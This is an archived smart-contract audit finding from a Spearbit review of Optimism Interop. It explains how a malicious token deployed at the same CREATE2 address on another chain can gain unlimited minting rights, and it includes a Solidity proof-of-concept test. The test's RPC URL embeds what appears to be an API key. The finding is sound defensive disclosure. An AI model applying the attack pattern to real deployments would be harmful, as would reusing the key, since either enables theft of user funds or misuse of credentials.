---
tags:
  - lang/solidity
  - sector/bridge
  - sector/governance
  - sector/multisig
  - sector/stable
  - sector/token
  - platform/spearbit
  - has/github
  - has/poc
  - severity/high
protocol: "[[Optimism Interop]]"
auditors:
  - Zach Obront
report: "https://github.com/spearbit/portfolio/blob/master/pdfs/OptimismInterop-Spearbit-Security-Review-February-2025.pdf"
genome:
  - "[[frontrun-exposure]]"
  - "[[direct-drain]]"
---
# Malicious tokens can be deployed at deterministic addresses on other chains to steal funds

- id: 50077
- impact: HIGH
- protocol: Optimism Interop
- reporter: Zach Obront (Spearbit)
- source: https://github.com/spearbit/portfolio/blob/master/pdfs/OptimismInterop-Spearbit-Security-Review-February-2025.pdf

## Summary


This bug report describes a high-risk vulnerability in the SuperchainTokenBridge. The issue occurs when sending an ERC20 token across the bridge, as the system assumes that the token has the same address on both chains. This allows for any two SuperchainERC20 compatible tokens to be exchanged freely, which can lead to malicious actors gaining unlimited minting rights on legitimate tokens. The report includes a proof of concept that demonstrates this vulnerability, and recommends that developers must set all important values in the token's constructor to ensure only an identical deployment with identical properties can be deployed to the same address. The report has been acknowledged by the OP Labs team, who have also provided recommendations in their documentation to prevent such vulnerabilities.

## Details

## Severity: High Risk

## Context
(No context files were provided by the reviewer)

## Description
When sending an ERC20 across the SuperchainTokenBridge, we assume that the token has the same address on both chains. In `sendERC20()`, we encode the sent token address in the relay call:

```solidity
bytes memory message = abi.encodeCall(this.relayERC20, (_token, msg.sender, _to, _amount));
```

In `relayERC20()`, we call `crosschainMint()` on this address:

```solidity
ISuperchainERC20(_token).crosschainMint(_to, _amount);
```

This means that any two SuperchainERC20 compatible tokens deployed on chains in the same cluster can be exchanged freely with one another. Currently, the plan is for these tokens to be deployed using a generic `CREATE2` factory. Given the existence of the same factory on both chains, the inputs into the deterministic generation of the token's address are the salt and the initialization code (which includes constructor arguments).

This means that any Superchain token implementation that either (a) uses a fixed address instead of constructor arguments to allocate initial tokens or ownership of the contract or (b) uses an `initialize()` function after the constructor for the same purposes, will be deployed to identical addresses with different outcomes. Note that this is near impossible to avoid because, each time a new chain is added to the interop set, the attack becomes possible. An astute attacker could predeploy token contracts on potential interop chains so that, upon interop being enabled, they would get unlimited minting rights on the legitimate tokens on other chains.

## Proof of Concept
The following test demonstrates the example where funds are sent in an `initialize()` function. Note that the same attack is possible if ownership is allocated this way, or if these values are set to hardcoded values (such as Gnosis Safes) that may be claimable on the other network.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test, console } from "forge-std/Test.sol";
import { SuperchainERC20 } from "@optimism/L2/SuperchainERC20.sol";

interface Create2Factory {
    function deploy(uint256 value, bytes32 salt, bytes memory code) external;
    function computeAddress(bytes32 salt, bytes32 codeHash) external view returns(address);
}

contract SuperchainUSDC is SuperchainERC20 {
    function initialize() external {
        require(totalSupply() == 0, "already initialized");
        _mint(msg.sender, 100_000_000e18);
    }

    function name() public pure override returns (string memory) {
        return "Superchain USDC";
    }
    
    function symbol() public pure override returns (string memory) {
        return "USDC";
    }
}

contract Create2Test is Test {
    Create2Factory CREATE2 = Create2Factory(0x13b0D85CcB8bf860b6b79AF3029fCA081AE9beF2);
    
    function testCreate2Address() external {
        address honest = address(uint160(uint256(keccak256("honest user"))));
        address malicious = address(uint160(uint256(keccak256("malicious user"))));
        
        vm.createSelectFork("https://optimism-mainnet.infura.io/v3/fb419f740b7e401bad5bec77d0d285a5");
        
        // On the original chain, a token is deployed with CREATE2 factory.
        uint before = vm.snapshot();
        bytes memory initCode = type(SuperchainUSDC).creationCode;
        vm.startPrank(honest);
        CREATE2.deploy(0, bytes32(0), initCode);
        SuperchainUSDC honestToken = SuperchainUSDC(CREATE2.computeAddress(bytes32(0), keccak256(initCode)));
        honestToken.initialize();
        assertEq(honestToken.balanceOf(honest), 100_000_000e18);
        
        // On the new chain, a malicious user deploys a token with the same code and claims the assets.
        vm.revertTo(before);
        vm.startPrank(malicious);
        CREATE2.deploy(0, bytes32(0), initCode);
        SuperchainUSDC maliciousToken = SuperchainUSDC(CREATE2.computeAddress(bytes32(0), keccak256(initCode)));
        maliciousToken.initialize();
        assertEq(maliciousToken.balanceOf(malicious), 100_000_000e18);
    }
}
```

## Recommendation
SuperchainToken developers must be made aware of the fact that all important values must be set in the token's constructor to ensure only an identical deployment with identical properties can be deployed to the same address.

## OP Labs
Acknowledged. From the documentation:
To ensure security, you must either design the deployer to allow only a specific trusted ERC-20 contract, such as SuperchainERC20, to be deployed through it, or call `CREATE2` to deploy the contract directly from an EOA you control. This precaution is critical because if an unauthorized ERC-20 contract is deployed at the same address on any Superchain network, it could allow malicious actors to mint unlimited tokens and bridge them to the network where the original ERC-20 contract resides.

## Cantina Managed
Acknowledged.
